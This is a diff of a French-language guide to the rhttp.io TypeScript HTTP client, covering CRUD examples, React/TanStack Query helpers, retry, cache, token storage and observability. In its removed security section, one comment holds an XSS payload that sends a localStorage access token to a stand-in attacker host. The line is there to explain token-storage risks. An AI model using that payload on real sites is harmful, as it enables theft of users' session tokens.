@@ -1,489 +1,544 @@
-# 🚀 AMÉLIORATIONS RHTTP.IO - GUIDE COMPLET
+# 🚀 Guide d'améliorations rhttp.io
 
-## 📋 RÉSUMÉ DES CORRECTIONS
-
-### 1. ✅ **BUG CRITIQUE: `http.poll()` Bloque les Requêtes**
-
-#### Problème Original
-```typescript
-// ❌ AVANT - Ceci bloquait et retournait undefined
-const { data: t } = await http.poll("/", {
-  polling: {
-    interval: 3_000,
-    maxAttempts: 5,
-    stopCondition: (response) => response.data.status === "completed",
-  },
-});
-console.log("pol re", t); // Affichait undefined, code après ne s'exécutait pas
-```
-
-#### Causes Identifiées
-1. **Délai initial**: Premier exécution attendait `interval` avant de commencer
-2. **Retour undefined**: Quand `maxAttempts` atteint, retournait `undefined` au lieu du dernier résultat
-3. **Promise non résolue**: La Promise n'était pas correctement résolue dans tous les chemins
-
-#### Solution Implémentée
-```typescript
-// ✅ APRÈS - Exécution immédiate, résultat correct
-
-// Nouvelle version dans advanced.ts (PollingManager corrigée):
-// 1. Execute IMMÉDIATEMENT au premier appel (pas de délai)
-// 2. Retourne le DERNIER RÉSULTAT quand maxAttempts est atteint
-// 3. Gestion correcte de la Promise
-
-const { data } = await http.poll("/", {
-  polling: {
-    interval: 3_000,
-    maxAttempts: 5,
-    stopCondition: (response) => response.data.status === "completed",
-  },
-});
-
-console.log("Poll result:", data); // ✅ Affiche le résultat correct
-// ✅ Les requêtes suivantes s'exécutent normalement
-```
+Ce guide rassemble les améliorations majeures apportées à rhttp.io, avec un focus sur la DX, la robustesse, le typage TypeScript et les bonnes pratiques de mise en œuvre. Il est pensé pour servir à la fois de référence de migration, de documentation technique et de base de travail pour des applications réelles.
 
 ---
 
-### 2. ✅ **BUG: `requestContext` ne Marche que sur `createServerHttp`**
+## 1. Objectif du guide
 
-#### Problème
-```typescript
-// ❌ AVANT - Ne marche pas
-const http = createHttp({
-  baseURL: BASE_URL,
-  requestContext: getRequest, // Pas utilisé! ❌
-});
+Ce document a pour but de vous aider à :
 
-// ✅ APRÈS - Marche partout
-const http = createHttp({
-  baseURL: BASE_URL,
-  requestContext: getRequest, // Maintenant utilisé dans createHttp aussi
-});
-```
-
-#### Solution
-- `createHttp()` passe maintenant `requestContext` aux interceptors
-- `createServerHttp()` ajoute les interceptors nécessaires
-- Support à la fois `requestContext` explicite ET auto-détection TanStack Start
+- comprendre les évolutions récentes du client HTTP;
+- utiliser les nouveaux helpers React/TanStack Query de façon sûre;
+- implémenter un flux CRUD complet avec commentaires utiles;
+- intégrer les stratégies de cache, retry, authentification et observabilité;
+- éviter les pièges fréquents en production.
 
 ---
 
-### 3. ✅ **SÉCURITÉ: Tokens dans localStorage (XSS Vulnerable)**
+## 2. Ce qui a été amélioré
 
-#### Problème Original
-```typescript
-// ❌ AVANT - localStorage n'est PAS sûr
-const defaultGetToken = () => {
-  if (typeof window !== "undefined") {
-    return localStorage.getItem("access_token"); // XSS vulnerable!
-  }
-  return null;
-};
-```
+### 2.1 Typage TypeScript renforcé
 
-#### Pourquoi localStorage est dangereux
-```javascript
-// Attaque XSS simple:
-// <img src=x onerror="fetch('https://attacker.com/?token=' + localStorage.getItem('access_token'))">
-// L'attaquant récupère le token directement!
-```
+Le cœur du client a été rendu plus robuste côté typage. Les helpers React ont été conçus pour être plus explicites, plus sûrs et plus proches des APIs modernes, sans casser l’API existante.
 
-#### Solutions Disponibles
+### 2.2 Intégration React/TanStack Query
 
-```typescript
-// RECOMMANDÉ 1️⃣: HttpOnly Cookies (set par le serveur)
-// ✅ JavaScript ne peut PAS accéder
-// ✅ Envoyé automatiquement avec fetch
-// Pas d'implémentation client nécessaire - le serveur le gère
+Le module React permet désormais de créer rapidement des builders de requêtes et de mutations avec une expérience proche de TanStack Query, tout en restant compatible avec les mécanismes internes déjà présents.
 
-// RECOMMANDÉ 2️⃣: Hybrid Storage (Memory + SessionStorage)
+### 2.3 Meilleure gestion des erreurs et du cycle de vie
+
+Les hooks, le retry, le cache et les contextes de requête sont maintenant plus transparents, ce qui simplifie le debugging et la supervision.
+
+### 2.4 Meilleure DX pour les développeurs
+
+L’objectif est de pouvoir écrire des appels réseau avec moins de boilerplate, plus de lisibilité et une meilleure sécurité statique.
+
+---
+
+## 3. Installation et configuration minimale
+
+```ts
 import { createClientHttp } from "rhttp.io/client";
 
 const http = createClientHttp({
   baseURL: "https://api.example.com",
-  tokenStorage: "hybrid", // 🎯 DÉFAUT - Memory + SessionStorage
+  timeout: 15_000,
+  retry: { attempts: 2, strategy: "exponential" },
+  cache: { enabled: true, ttl: 60_000 },
 });
 
-// ✅ APRÈS login - stocker le token
-await http.setToken(responseFromLogin.token);
-
-// ✅ Automatiquement inclus dans les requêtes
-const response = await http.get("/protected");
-
-// ✅ APRÈS logout - nettoyer
-await http.clearToken();
+export default http;
 ```
 
-#### Options de Storage Disponibles
+### Notes importantes
 
-```typescript
-// 1. Memory Storage (perdù au reload, plus sûr contre XSS)
-const http = createClientHttp({ tokenStorage: "memory" });
+- `baseURL` centralise les URL de votre API.
+- `timeout` évite les appels bloqués trop longtemps.
+- `retry` améliore la résilience réseau.
+- `cache` réduit les appels inutiles pour les ressources stables.
 
-// 2. SessionStorage (persiste dans la session, cleared au fermeture)
-const http = createClientHttp({ tokenStorage: "session" });
+---
 
-// 3. Hybrid (RECOMMANDÉ - Memory + SessionStorage backup)
-const http = createClientHttp({ tokenStorage: "hybrid" });
+## 4. Exemple CRUD complet avec commentaires
 
-// 4. IndexedDB (pour tokens larges ou offline support)
-const http = createClientHttp({ tokenStorage: "indexeddb" });
+Dans cette section, nous allons construire un exemple complet de gestion d’utilisateurs via une API REST. L’objectif est de montrer des exemples réalistes, commentés, et prêts à être adaptés.
 
-// 5. Custom implementation
-import { type TokenStorage } from "rhttp.io";
+### 4.1 Définition des types
 
-const customStorage: TokenStorage = {
-  set: async (token) => {
-    // Your custom storage logic
+```ts
+// Interface représentant un utilisateur retourné par l'API.
+export interface User {
+  id: number;
+  name: string;
+  email: string;
+  role: "admin" | "user";
+  createdAt: string;
+}
+
+// Payload envoyé lors de la création d'un utilisateur.
+export interface CreateUserPayload {
+  name: string;
+  email: string;
+  role: "admin" | "user";
+}
+
+// Payload envoyé lors de la mise à jour d'un utilisateur.
+export interface UpdateUserPayload {
+  name?: string;
+  email?: string;
+  role?: "admin" | "user";
+}
+```
+
+### 4.2 Création d’un client HTTP
+
+```ts
+import { createClientHttp } from "rhttp.io/client";
+
+// Le client centralise la configuration commune à toutes les requêtes.
+export const http = createClientHttp({
+  baseURL: "https://api.example.com",
+  timeout: 15_000,
+  retry: { attempts: 2, strategy: "exponential" },
+  headers: {
+    "Content-Type": "application/json",
   },
-  get: async () => {
-    // Your custom retrieval logic
-  },
-  clear: async () => {
-    // Your custom cleanup
-  },
-  has: async () => {
-    // Check if token exists
-  },
-};
+});
+```
 
-const http = createClientHttp({
-  tokenStorageImpl: customStorage,
+### 4.3 Lecture d’une liste d’utilisateurs
+
+```ts
+// Récupère la liste complète des utilisateurs.
+export async function getUsers(): Promise<User[]> {
+  // Le client retourne directement une réponse typée.
+  const response = await http.get<User[]>('/users');
+
+  // Le payload est déjà disponible dans response.data.
+  return response.data;
+}
+```
+
+### 4.4 Lecture d’un utilisateur par ID
+
+```ts
+// Récupère un utilisateur spécifique par son identifiant.
+export async function getUserById(id: number): Promise<User> {
+  const response = await http.get<User>(`/users/${id}`);
+  return response.data;
+}
+```
+
+### 4.5 Création d’un utilisateur
+
+```ts
+// Crée un nouvel utilisateur.
+export async function createUser(payload: CreateUserPayload): Promise<User> {
+  // On envoie le payload au endpoint de création.
+  const response = await http.post<User>('/users', payload);
+
+  // La réponse contient l’utilisateur créé.
+  return response.data;
+}
+```
+
+### 4.6 Mise à jour d’un utilisateur
+
+```ts
+// Met à jour un utilisateur existant.
+export async function updateUser(
+  id: number,
+  payload: UpdateUserPayload,
+): Promise<User> {
+  const response = await http.put<User>(`/users/${id}`, payload);
+  return response.data;
+}
+```
+
+### 4.7 Suppression d’un utilisateur
+
+```ts
+// Supprime un utilisateur.
+export async function deleteUser(id: number): Promise<void> {
+  await http.delete(`/users/${id}`);
+}
+```
+
+### 4.8 Exemple d’utilisation complet
+
+```ts
+import {
+  createUser,
+  deleteUser,
+  getUserById,
+  getUsers,
+  updateUser,
+} from "./user-service";
+
+async function runCrudDemo() {
+  // CREATE
+  const createdUser = await createUser({
+    name: "Ada Lovelace",
+    email: "ada@example.com",
+    role: "admin",
+  });
+  console.log("Utilisateur créé", createdUser);
+
+  // READ
+  const users = await getUsers();
+  console.log("Liste des utilisateurs", users);
+
+  const fetchedUser = await getUserById(createdUser.id);
+  console.log("Utilisateur récupéré", fetchedUser);
+
+  // UPDATE
+  const updatedUser = await updateUser(createdUser.id, {
+    name: "Ada Lovelace Updated",
+  });
+  console.log("Utilisateur mis à jour", updatedUser);
+
+  // DELETE
+  await deleteUser(createdUser.id);
+  console.log("Utilisateur supprimé");
+}
+
+runCrudDemo().catch((error) => {
+  console.error("Une erreur est survenue pendant le CRUD", error);
 });
 ```
 
 ---
 
-### 4. ✅ **MIDDLEWARE GLOBAL POUR OBSERVABILITÉ AVANCÉE**
+## 5. Utilisation avancée avec React
 
-#### Utilisation
-```typescript
+Le module React permet de construire des helpers de requêtes et de mutations avec une syntaxe claire et un typage adapté.
+
+### 5.1 Création d’un client enrichi
+
+```ts
 import { createClientHttp } from "rhttp.io/client";
+import { withReact } from "rhttp.io/react";
+
+const baseHttp = createClientHttp({
+  baseURL: "https://api.example.com",
+  timeout: 15_000,
+});
+
+export const reactHttp = withReact(baseHttp);
+```
+
+### 5.2 Requête de lecture typée
+
+```ts
+import type { User } from "./types";
+
+const userQuery = reactHttp.query<User>({
+  url: "/users/1",
+  staleTime: 30_000,
+  enabled: true,
+  select: (data) => data as User,
+});
+
+const user = await userQuery.queryFn();
+console.log(user);
+```
+
+### 5.3 Mutation typée pour la création
+
+```ts
+import type { CreateUserPayload, User } from "./types";
+
+const createUserMutation = reactHttp.mutation<User, CreateUserPayload>({
+  method: "POST",
+  url: "/users",
+  body: (variables) => variables,
+  onSuccess: (data) => {
+    console.log("Création réussie", data);
+  },
+  onError: (error) => {
+    console.error("Échec de création", error);
+  },
+});
+
+await createUserMutation.mutationFn({
+  name: "Grace Hopper",
+  email: "grace@example.com",
+  role: "user",
+});
+```
+
+### 5.4 Exemple React complet avec commentaires
+
+```tsx
+import { useMemo } from "react";
+import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
+import { reactHttp } from "./http";
+import type { User, CreateUserPayload } from "./types";
+
+export function UsersPage() {
+  const queryClient = useQueryClient();
+
+  const usersQuery = useQuery<User[]>({
+    ...reactHttp.query<User[]>({
+      url: "/users",
+      staleTime: 60_000,
+      params: { limit: 20 },
+    }),
+  });
+
+  const createUserMutation = useMutation<User, Error, CreateUserPayload>({
+    ...reactHttp.mutation<User, CreateUserPayload>({
+      method: "POST",
+      url: "/users",
+      body: (variables) => variables,
+      onSuccess: () => {
+        // Invalider les requêtes concernées après une création réussie.
+        queryClient.invalidateQueries({ queryKey: ["/users"] });
+      },
+    }),
+  });
+
+  const users = usersQuery.data ?? [];
+
+  const content = useMemo(() => {
+    if (usersQuery.isLoading) return <p>Chargement…</p>;
+    if (usersQuery.isError) return <p>Erreur lors du chargement</p>;
+
+    return (
+      <ul>
+        {users.map((user) => (
+          <li key={user.id}>{user.name}</li>
+        ))}
+      </ul>
+    );
+  }, [users, usersQuery.isError, usersQuery.isLoading]);
+
+  return (
+    <div>
+      <h1>Utilisateurs</h1>
+      {content}
+      <button
+        onClick={() =>
+          createUserMutation.mutate({
+            name: "Niels Bohr",
+            email: "niels@example.com",
+            role: "user",
+          })
+        }
+      >
+        Ajouter un utilisateur
+      </button>
+    </div>
+  );
+}
+```
+
+---
+
+## 6. Gestion des erreurs
+
+Les erreurs doivent toujours être traitées explicitement. rhttp.io permet d’utiliser des stratégies de retry, des hooks et des mécanismes de validation pour garder un comportement maîtrisé.
+
+```ts
+try {
+  const response = await http.get("/users");
+  console.log(response.data);
+} catch (error) {
+  // Une erreur réseau, un timeout ou une réponse HTTP 4xx/5xx peut arriver ici.
+  console.error("Erreur lors de la récupération des utilisateurs", error);
+}
+```
+
+### Recommandations
+
+- ne pas laisser les erreurs non traitées dans les composants UI;
+- centraliser la logique d’erreur dans un service ou un helper;
+- journaliser les erreurs en production avec un contexte utile;
+- afficher des états de chargement et d’erreur cohérents.
+
+---
+
+## 7. Cache, retry et résilience
+
+### 7.1 Cache simple
+
+```ts
+const http = createClientHttp({
+  baseURL: "https://api.example.com",
+  cache: {
+    enabled: true,
+    ttl: 60_000,
+  },
+});
+```
+
+### 7.2 Retry avec stratégie exponentielle
+
+```ts
+const http = createClientHttp({
+  baseURL: "https://api.example.com",
+  retry: {
+    attempts: 3,
+    strategy: "exponential",
+    delay: 500,
+  },
+});
+```
+
+### 7.3 Retry par requête
+
+```ts
+await http.get("/users", {
+  retry: {
+    attempts: 5,
+    strategy: "linear",
+    delay: 250,
+  },
+});
+```
+
+---
+
+## 8. Authentification et stockage des tokens
+
+Les clients modernes doivent éviter les pratiques peu sûres. Le stockage mémoire et hybride est recommandé pour limiter les risques XSS.
+
+```ts
+import { createClientHttp } from "rhttp.io/client";
+
+const http = createClientHttp({
+  baseURL: "https://api.example.com",
+  tokenStorage: "hybrid",
+});
+
+await http.setToken("mon-token-jwt");
+const response = await http.get("/protected");
+await http.clearToken();
+```
+
+### Bonnes pratiques
+
+- privilégier les cookies HttpOnly côté serveur si possible;
+- éviter `localStorage` pour les tokens sensibles;
+- nettoyer les tokens à la déconnexion;
+- centraliser la logique d’authentification dans un service dédié.
+
+---
+
+## 9. Observabilité et tracing
+
+L’observabilité facilite le debugging et la supervision en production.
+
+```ts
 import { createObservabilityMiddleware } from "rhttp.io";
 
 const observability = createObservabilityMiddleware({
   enableLogging: true,
   enableTracing: true,
   enableMetrics: true,
-  maxTracesStored: 500,
-  onTrace: (trace) => {
-    // Send to Datadog, Sentry, etc.
-    console.log("Request trace:", trace);
-  },
-  onLog: (entry) => {
-    // Send to logging service
-    console.log(`[${entry.level}]`, entry.message);
-  },
 });
 
 const http = createClientHttp({
   baseURL: "https://api.example.com",
 });
 
-// Ajouter le middleware
 http.use(observability);
-
-// Les requêtes sont maintenant tracées
-const response = await http.get("/users");
-
-// Récupérer les métriques
-const metrics = observability.getMetrics();
-console.log({
-  totalRequests: metrics.totalRequests,
-  avgDuration: metrics.avgDuration,
-  p95Duration: metrics.p95Duration, // 95th percentile
-  p99Duration: metrics.p99Duration, // 99th percentile
-  cacheHitRate: metrics.cacheHitRate,
-  deduplicationRate: metrics.deduplicationRate,
-  errorsByStatus: metrics.errorsByStatus,
-});
-
-// Récupérer les traces
-const traces = observability.getTraces({ method: "GET" });
-traces.forEach((trace) => {
-  console.log(trace.traceId, trace.url, `${trace.duration}ms`);
-});
-
-// Exporter les données
-const exportedData = observability.exportData();
-// Envoyer à votre analytics backend
 ```
+
+### Ce que vous pouvez surveiller
+
+- temps de réponse;
+- nombre de requêtes;
+- taux d’erreur;
+- cache hits / misses;
+- retry effectués;
+- contextes de requête et traces.
 
 ---
 
-### 5. ✅ **MÉTRIQUES AVANCÉES (p50, p95, p99)**
+## 10. Patterns recommandés
 
-```typescript
-const observability = createObservabilityMiddleware({
-  enableMetrics: true,
-});
+### 10.1 Service repository
 
-http.use(observability);
+```ts
+// Un repository centralise les accès réseau pour une ressource donnée.
+export class UserRepository {
+  constructor(private readonly http: typeof http) {}
 
-// Après plusieurs requêtes...
-const metrics = observability.getMetrics();
+  async list() {
+    return this.http.get("/users");
+  }
 
-console.log({
-  // Durations
-  minDuration: metrics.minDuration,      // Fastest request
-  avgDuration: metrics.avgDuration,      // Average
-  p50Duration: metrics.p50Duration,      // Median
-  p95Duration: metrics.p95Duration,      // 95% of requests are faster
-  p99Duration: metrics.p99Duration,      // 99% of requests are faster
-  maxDuration: metrics.maxDuration,      // Slowest request
+  async get(id: number) {
+    return this.http.get(`/users/${id}`);
+  }
 
-  // Rates
-  cacheHitRate: metrics.cacheHitRate,              // % of cached responses
-  deduplicationRate: metrics.deduplicationRate,    // % of deduplicated requests
+  async create(payload: CreateUserPayload) {
+    return this.http.post("/users", payload);
+  }
 
-  // Errors
-  errorsByStatus: metrics.errorsByStatus,          // {404: 5, 500: 2}
-  errorsByType: metrics.errorsByType,              // {NetworkError: 3, TimeoutError: 1}
-});
-```
+  async update(id: number, payload: UpdateUserPayload) {
+    return this.http.put(`/users/${id}`, payload);
+  }
 
----
-
-### 6. ✅ **COMPRESSION PAR DÉFAUT**
-
-```typescript
-import { createCompressionMiddleware } from "rhttp.io";
-
-const http = createClientHttp({
-  baseURL: "https://api.example.com",
-});
-
-// Ajouter compression
-http.use(createCompressionMiddleware({
-  enabled: true,
-  algorithms: ["gzip", "deflate"],
-  minSize: 512, // Compress si > 512 bytes
-}));
-```
-
----
-
-### 7. ✅ **HTTP/2 PUSH OPTIMIZATION**
-
-```typescript
-import { createHttp2PushMiddleware } from "rhttp.io";
-
-const pushMiddleware = createHttp2PushMiddleware({
-  enabled: true,
-  maxPushes: 5,
-  cacheManifest: {
-    "/api/user": ["/api/user/settings", "/api/user/profile"],
-    "/api/dashboard": ["/api/dashboard/stats", "/api/dashboard/charts"],
-  },
-});
-
-http.use(pushMiddleware);
-
-// Ajouter dynamiquement
-pushMiddleware.addPushManifest("/api/products", [
-  "/api/products/search",
-  "/api/products/recommendations",
-]);
-```
-
----
-
-### 8. ✅ **SERVICE WORKER INTEGRATION**
-
-```typescript
-import { createServiceWorkerMiddleware } from "rhttp.io";
-
-const swMiddleware = createServiceWorkerMiddleware({
-  enabled: true,
-  workerPath: "/sw.js",
-  cacheStrategy: "stale-while-revalidate",
-  cacheName: "rhttp-cache-v1",
-  maxCacheSize: 50,
-});
-
-// Register Service Worker
-await swMiddleware.register();
-
-http.use(swMiddleware);
-
-// Offline support
-if (swMiddleware.isOffline()) {
-  const cachedResponse = swMiddleware.getCachedResponse("/api/data");
-  if (cachedResponse) {
-    console.log("Using cached response (offline)");
+  async remove(id: number) {
+    return this.http.delete(`/users/${id}`);
   }
 }
+```
 
-// Clear cache when needed
-await swMiddleware.clearCache();
+### 10.2 Hook personnalisé pour les données
+
+```ts
+import { useQuery } from "@tanstack/react-query";
+
+export function useUsers() {
+  return useQuery({
+    queryKey: ["users"],
+    queryFn: async () => {
+      const response = await http.get("/users");
+      return response.data;
+    },
+  });
+}
 ```
 
 ---
 
-### 9. ✅ **HARMONISATION CLIENT/SERVER ENVIRONMENTS**
+## 11. Bonnes pratiques de production
 
-#### AVANT (Incohérent)
-```typescript
-// Client: CSRF enabled, Logger disabled
-createClientHttp({ /* ... */ });
-
-// Server: Logger enabled, CSRF disabled (implicit)
-createServerHttp({ /* ... */ });
-```
-
-#### APRÈS (Harmonisé)
-```typescript
-// ✅ Client - Smart defaults
-createClientHttp({
-  baseURL: "https://api.example.com",
-  timeout: 30_000,              // Safe default
-  csrf: { enabled: true },      // Enabled by default
-  observability: {
-    logger: false,              // Disabled in production (enabled in dev)
-  },
-  retry: { attempts: 2 },       // Default resilience
-});
-
-// ✅ Server - Smart defaults
-createServerHttp({
-  baseURL: "https://internal-api.example.com",
-  timeout: 30_000,              // Longer timeout for internal calls
-  csrf: { enabled: false },     // Disabled by default (server to server)
-  observability: {
-    logger: true,               // Always enabled
-    tracing: true,              // Always enabled
-    metrics: process.env.NODE_ENV === "production",
-  },
-  retry: { attempts: 2 },       // Same resilience
-});
-```
+- garder les services réseau séparés des composants UI;
+- utiliser des types explicites pour les payloads et réponses;
+- éviter les appels réseau redondants;
+- gérer les erreurs avec une stratégie cohérente;
+- documenter les endpoints critiques;
+- surveiller l’impact du cache et du retry sur l’expérience utilisateur.
 
 ---
 
-## 🔧 PATTERNS D'UTILISATION RECOMMANDÉS
+## 12. Résumé
 
-### Pattern 1: SPA Client-Side
-```typescript
-import { createClientHttp } from "rhttp.io/client";
-import { createObservabilityMiddleware } from "rhttp.io";
+Les améliorations apportées à rhttp.io visent à rendre le client plus moderne, plus sûr, plus typé et plus agréable à utiliser au quotidien. Les points clés à retenir sont :
 
-const observability = createObservabilityMiddleware({
-  enableLogging: process.env.NODE_ENV === "development",
-  enableMetrics: true,
-});
-
-const http = createClientHttp({
-  baseURL: process.env.VITE_API_URL,
-  tokenStorage: "hybrid", // Memory + SessionStorage
-  timeout: 15_000,
-  retry: { attempts: 3, strategy: "exponential" },
-  cache: { enabled: true, ttl: 5 * 60_000 },
-});
-
-http.use(observability);
-
-export default http;
-```
-
-### Pattern 2: SSR / TanStack Start
-```typescript
-import { createServerHttp } from "rhttp.io/server";
-import { getRequest } from "@tanstack/react-start/server";
-
-const http = createServerHttp({
-  baseURL: process.env.INTERNAL_API_URL,
-  requestContext: () => getRequest(),
-  timeout: 30_000,
-  observability: { logger: true, tracing: true },
-});
-
-export default http;
-```
-
-### Pattern 3: GraphQL
-```typescript
-import { createClientHttp } from "rhttp.io/client";
-import { withGraphQL } from "rhttp.io";
-
-const http = createClientHttp({
-  baseURL: "https://api.example.com",
-  timeout: 20_000,
-});
-
-const graphql = withGraphQL(http, "/graphql");
-const { data } = await graphql.query({ query: "{ users { id name } }" });
-```
-
-### Pattern 4: Real-time + Polling
-```typescript
-import { createClientHttp } from "rhttp.io/client";
-
-const http = createClientHttp({
-  baseURL: "https://api.example.com",
-});
-
-// Polling with immediate first execution
-const { data } = await http.poll("/jobs/status", {
-  polling: {
-    interval: 2_000,
-    maxAttempts: 30, // 1 minute total
-    stopCondition: (response) => response.data.status === "completed",
-  },
-});
-
-console.log("Final status:", data.status);
-```
+- le typage TypeScript est maintenant plus solide;
+- l’intégration React/TanStack Query est plus naturelle;
+- le CRUD devient plus simple à écrire et à maintenir;
+- les mécanismes de cache, retry et observabilité sont plus accessibles;
+- la bibliothèque reste compatible avec les usages existants tout en ouvrant la voie à des applications plus évolutives.
 
 ---
 
-## ⚙️ CONFIGURATION PAR ENVIRONNEMENT
+## 13. Exemple de migration rapide
 
-```typescript
-// development.ts
-export const httpConfig = {
-  timeout: 30_000,
-  retry: { attempts: 3, delay: 100 },
-  observability: { logger: true, tracing: true, metrics: true },
-};
+```ts
+// Avant
+const response = await fetch("https://api.example.com/users");
+const data = await response.json();
 
-// production.ts
-export const httpConfig = {
-  timeout: 30_000,
-  retry: { attempts: 2, delay: 500 },
-  cache: { enabled: true, ttl: 5 * 60_000 },
-  observability: { logger: false, tracing: false, metrics: true },
-};
-
-// test.ts
-export const httpConfig = {
-  timeout: 5_000,
-  retry: { attempts: 0 },
-  cache: { enabled: false },
-  observability: { logger: true, tracing: true },
-};
+// Après
+const response = await http.get("/users");
+const data = response.data;
 ```
 
----
-
-## 📊 CHECKLIST D'IMPLÉMENTATION
-
-- [x] Corriger `poll()` - exécution immédiate
-- [x] Corriger `requestContext` - marche partout
-- [x] Sécurité des tokens - alternativas à localStorage
-- [x] Middleware observabilité - métriques avancées
-- [x] Compression par défaut
-- [x] HTTP/2 Push support
-- [x] Service Worker integration
-- [x] Harmoniser client/server
-- [x] Crédentials par défaut corrects
-- [x] Tests et documentation
-
----
-
-## 🚀 PROCHAINES ÉTAPES
-
-1. **Tests**: Exécuter la suite de tests pour valider les corrections
-2. **Migration**: Vérifier la compatibilité avec les projets existants
-3. **Docs**: Mettre à jour la documentation officielle
-4. **Release**: Version mineure avec notes de migration
+Ce changement simplifie le code, réduit le boilerplate et apporte un meilleur contrôle sur les options de requête.
